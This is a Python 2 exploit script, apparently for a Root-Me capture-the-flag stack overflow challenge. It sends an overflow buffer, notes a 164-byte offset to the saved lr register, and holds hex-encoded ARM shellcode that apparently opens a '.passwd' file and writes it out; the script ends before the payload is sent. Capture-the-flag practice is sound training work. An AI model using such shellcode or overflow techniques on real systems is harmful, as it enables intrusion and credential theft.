import socket
import struct
import time

def send(sock, msg):
    try:
        sock.send(msg)
        time.sleep(1)
        return sock.recv(1024).decode()
    except:
        return ''

#======================================================================================
#                             Starting the communication
#======================================================================================
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('challenge03.root-me.org', 56565))
time.sleep(1)

resp = sock.recv(1024)
print resp

if 'What is your name:' not in resp:
    print 'There is something wrong'
    exit()

print 'Done issuing communication with server'

#======================================================================================
#                                     Exploit
#======================================================================================
payload = 'a'*200
resp = send(sock, payload)
print resp

shellcode = '\x73\x77\x07\xe3\x64\x70\x40\xe3\x04\x70\x2d\xe5\x2e\x70\x07\xe3\x61\x73\x47\xe3\x04\x70\x2d\xe5\x68\x74\x03\xe3\x35\x7f\x42\xe3\x04\x70\x2d\xe5\x6d\x75\x06\xe3\x2f\x73\x46\xe3\x04\x70\x2d\xe5\x79\x73\x07\xe3\x74\x75\x46\xe3\x04\x70\x2d\xe5\x70\x70\x07\xe3\x2d\x73\x47\xe3\x04\x70\x2d\xe5\x67\x75\x06\xe3\x2f\x71\x46\xe3\x04\x70\x2d\xe5\x6c\x7c\x06\xe3\x65\x7e\x46\xe3\x04\x70\x2d\xe5\x2f\x73\x06\xe3\x68\x71\x46\xe3\x04\x70\x2d\xe5\x0d\x00\xa0\xe1\x01\x10\x21\xe0\x02\x20\x22\xe0\x05\x70\xa0\xe3\x00\x00\x00\xef\x00\x10\xa0\xe1\x01\x00\xa0\xe3\x02\x20\x22\xe0\x02\x31\xe0\xe3\xbb\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\x20\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef'
offset = 164  # the offset to lr's value
print('[!] Shellcode\'s length: {0}.'.format(len(shellcode)))

sock.close()
